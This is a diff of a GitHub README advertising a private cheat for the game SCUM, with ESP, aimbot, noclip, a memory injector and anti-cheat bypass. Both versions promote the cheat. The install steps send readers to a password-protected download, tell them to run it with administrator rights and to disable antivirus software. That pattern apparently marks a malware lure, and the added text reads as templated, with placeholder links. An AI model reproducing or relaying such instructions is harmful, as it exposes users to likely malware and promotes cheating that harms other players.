@@ -1,126 +1,117 @@
-<div align="center">
-    <h1 style="font-size:2.5em;color:#FF4500;">🔥 Optima SCUM Private ESP 🔥</h1>
-    <h2 style="color:#4682B4;">Undetected cheat with unique anti-cheat bypass</h2>
-</div>
+```markdown
+# Private SCUM ESP Solution for Undetected Gameplay 🎮✨
+
+![GitHub Repo stars](https://img.shields.io/github/stars/kx1mxx/Private-ESP-for-SCUM-Optima?style=social)
+![GitHub Repo forks](https://img.shields.io/github/forks/kx1mxx/Private-ESP-for-SCUM-Optima?style=social)
+![Version](https://img.shields.io/badge/version-1.0.0-blue)
+
+## Overview
+
+Welcome to the **Private-ESP-for-SCUM-Optima** repository. This project provides a private ESP solution tailored for SCUM, focusing on security and undetected gameplay. Our approach ensures that players can enjoy the game while minimizing the risk of detection.
+
+### Key Features
+
+- **Anti-Cheat Bypass Technology**: Our unique technology allows for gameplay enhancements without triggering anti-cheat systems.
+- **Advanced Gameplay Enhancements**: Gain a competitive edge with features designed to improve your gaming experience.
+- **Long-Term Undetected Gameplay**: Our solution prioritizes security, allowing for extended use without detection.
+
+## Installation
+
+To get started, you need to download the latest release. Visit the [Releases section](https://github.com/kx1mxx/Private-ESP-for-SCUM-Optima/releases) to find the latest version. Download the file, extract it, and execute it to begin.
+
+## Usage
+
+1. **Launch the Game**: Start SCUM as you normally would.
+2. **Run the ESP**: Execute the downloaded file. Ensure it runs with administrative privileges for optimal performance.
+3. **Configure Settings**: Adjust the settings to fit your gameplay style. You can customize various features for a tailored experience.
+4. **Play Securely**: Enjoy your enhanced gameplay while remaining undetected.
+
+## Features Breakdown
+
+### ESP (Extra Sensory Perception)
+
+The ESP feature provides you with real-time information about other players and resources in the game. You can see:
+
+- Player Locations
+- Item Locations
+- Resource Availability
+
+### Anti-Cheat Mechanism
+
+Our anti-cheat bypass is designed to blend seamlessly with the game environment. It ensures that your enhancements do not raise any flags with the game’s security systems.
+
+### Customization Options
+
+You can tailor the ESP to suit your preferences. Options include:
+
+- Color Schemes: Choose colors that stand out against the game environment.
+- Transparency Levels: Adjust how visible the ESP markers are.
+- Toggle Features: Enable or disable specific features based on your needs.
+
+## Topics
+
+This repository covers various topics related to SCUM gameplay enhancements. Here are some relevant tags:
+
+- `scum`
+- `scum-2025`
+- `scum-aim`
+- `scum-esp`
+- `scum-hack`
+- `scum-premium-hacks`
+
+These topics help in organizing content and making it easier for users to find related resources.
+
+## Troubleshooting
+
+If you encounter issues while using the ESP solution, consider the following steps:
+
+1. **Check Compatibility**: Ensure that you are using the correct version of SCUM.
+2. **Run as Administrator**: Make sure to run the ESP application with administrative rights.
+3. **Disable Conflicting Software**: Some antivirus or anti-cheat software may interfere with the ESP. Temporarily disable them if necessary.
+
+If problems persist, please check the [Releases section](https://github.com/kx1mxx/Private-ESP-for-SCUM-Optima/releases) for updates or fixes.
+
+## Community
+
+Join our community for support, updates, and discussions. Connect with other players and share your experiences. You can find us on Discord and various gaming forums.
+
+## Contributing
+
+We welcome contributions from the community. If you have ideas for features or improvements, please submit a pull request. Here’s how to contribute:
+
+1. **Fork the Repository**: Create your own copy of the project.
+2. **Make Changes**: Implement your features or fixes.
+3. **Submit a Pull Request**: Share your changes with the community for review.
+
+## License
+
+This project is licensed under the MIT License. See the LICENSE file for more details.
+
+## Contact
+
+For inquiries or support, please reach out via the GitHub Issues page or connect through our community channels.
+
+## Download Now
+
+Ready to enhance your gameplay? Download the latest release [here](https://github.com/kx1mxx/Private-ESP-for-SCUM-Optima/releases) and start your journey towards a better gaming experience!
+
+![SCUM Gameplay](https://example.com/scum-gameplay-image.jpg)
+
+### Acknowledgments
+
+We appreciate the contributions of everyone involved in making this project possible. Special thanks to the community for their feedback and support.
+
+### Disclaimer
+
+This project is intended for educational purposes only. Use it responsibly and at your own risk.
+
+## Additional Resources
+
+- [SCUM Official Website](https://scumgame.com)
+- [Game Guides and Tips](https://example.com/scum-guides)
+- [Discord Community](https://discord.gg/example)
 
 ---
 
-<div align="center">
-    <h2 style="color:#32CD32;">📸 Screenshots</h2>
-    <img src="https://github.com/user-attachments/assets/25fc6969-4eb8-4936-8286-ebc82444d859" alt="ESP Example" width="80%" style="border:2px solid #FF4500;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-    <img src="https://github.com/user-attachments/assets/2be5933e-8dbf-4263-b159-8e088f664758" alt="Menu Example" width="80%" style="border:2px solid #4682B4;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-</div>
-
----
-
-## 🌟 **Overview**
-Private SCUM ESP solution from Optima with focus on security and long-term undetected gameplay. Features unique anti-cheat bypass technology and advanced gameplay enhancements.
-
----
-
-## 🚀 **Installation**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    <ol>
-        <li>
-            <b style="color:#FF4500;">Download:</b>  
-            <a href="https://github.com/Reggyalesh/Private-ESP-for-SCUM-Optima/releases/download/latest/Optima.zip" style="text-decoration:none;color:#4682B4;">🔹 Download From Github 🔹</a>
-        </li>
-        <li>
-            <b style="color:#32CD32;">Extract archive:</b>  
-            💼 Password: Optima
-        </li>
-        <li>
-            <b style="color:#FF4500;">Run loader:</b>  
-            Launch the executable file
-        </li>
-        <li>
-            <b style="color:#4682B4;">Activate:</b>  
-            Press <b>INSERT</b> to open menu in-game
-        </li>
-    </ol>
-</div>
-
----
-
-<div align="center">
-    <h2 style="color:#32CD32;">💡 Features</h2>
-</div>
-
-### **ESP Features**
-- **Player ESP**:
-  - Visible/Invisible differentiation
-  - Boxes (2D/Corner/Filled)
-  - Skeletons
-  - Health bars/text
-  - Distance indicators
-  - Name tags
-  - Chams (colored models)
-
-- **Zombie ESP**:
-  - Same visualization options as players
-  - Special zombie chams (Ghost/Wireframe)
-
-- **Loot & World ESP**:
-  - Chests/Containers
-  - Weapons/Ammo
-  - Clothing/Equipment
-  - Food/Medical
-  - Vehicles
-  - Item durability
-  - Distance filtering
-
-### **Aimbot**
-- Silent aim technology
-- Customizable FOV circle
-- Target selection (Players/Zombies)
-- Bone selection
-- Operation modes (Always/On Key)
-- Anti-recoil
-- High damage mode
-- No weapon degradation
-
-### ⚙️ **Miscellaneous**
-- Fullbright mode (night vision)
-- Developer mode (object highlighting)
-- Custom color schemes
-- Configuration system (Save/Load)
-- Multi-language support (EN/RU)
-- No fall damage
-- Collision disable (noclip)
-- Loot teleportation
-- Map teleportation
-- Auto lock picking
-
----
-
-## 📄 **Security**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    <ul>
-        <li>Unique memory injection method</li>
-        <li>Regular signature updates</li>
-        <li>HWID-based authentication</li>
-        <li>No public releases (private only)</li>
-    </ul>
-</div>
-
----
-
-## ⚠️ **Disclaimer**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;border-left:4px solid #FF4500;">
-    This software is provided for educational purposes only. Using cheats in online games may violate terms of service and result in account penalties. Use at your own risk.
-</div>
-
----
-
-<div align="center">
-    <h2 style="color:#4682B4;">📬 Support</h2>
-    <p>Contact our technical team:</p>
-    <a href="https://optima-cheats.ru/support" style="text-decoration:none;color:#FF4500;">🔹 Support Portal 🔹</a><br>
-    Email: <b style="color:#32CD32;">support@optima-cheats.ru</b><br>
-</div>
-
-<div align="center" style="margin-top:30px;">
-    <img src="https://img.shields.io/badge/Version-2.4.1-green" alt="Version">
-    <img src="https://img.shields.io/badge/Status-Undetected-brightgreen" alt="Status">
-    <img src="https://img.shields.io/badge/SCUM-0.9.5.65432-blue" alt="Game Version">
-</div>
+Stay updated with the latest changes and features by checking back frequently. We aim to keep this repository active and responsive to community needs.
+```
